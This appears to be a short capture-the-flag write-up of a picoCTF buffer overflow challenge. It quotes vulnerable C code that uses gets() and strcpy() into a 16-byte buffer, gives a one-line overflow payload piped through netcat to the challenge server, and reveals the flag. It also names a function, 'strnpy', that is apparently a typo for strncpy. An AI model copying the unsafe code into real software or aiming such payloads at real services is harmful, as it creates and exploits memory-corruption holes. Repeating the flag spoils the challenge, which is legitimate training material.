### Current progress: Done

An unstripped ELF 32-bit executable and its c source code was given.

As the challenge name suggest, this is likely a buffer overflow problem.

The point of focus in our c code is this `vuln` function:
```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

and part of the `main` function:
```c
char buf1[100];
gets(buf1); 
vuln(buf1);
```

Copying an array of 100 characters into one that's 16 characters is not a good idea.
In fact, one should never use `strcpy` and should use `strnpy` instead.
Here is a [YouTube video](https://youtu.be/7mKfWrNQcj0) by Jacob Sorber explains why not to ever use `strcpy`.

We `chmod +x vuln` and then printing "A"  `python -c 'print("A" * 20)' | ./vuln` which gives us our test `flag.txt`

### Explanation
The flag is given when the program received a segfaults:
```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```
and here's where they attached `sigsegv_handler` to the `SIGSEGV` (segfault):
```c
signal(SIGSEGV, sigsegv_handler); // Set up signal handler
```

Anyway, we can adapt the code to be piped into netcat as follow:
```bash
python -c 'print("A" * 20)' | nc saturn.picoctf.net [port]
```

This gives use the flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_ee2fd2b1}`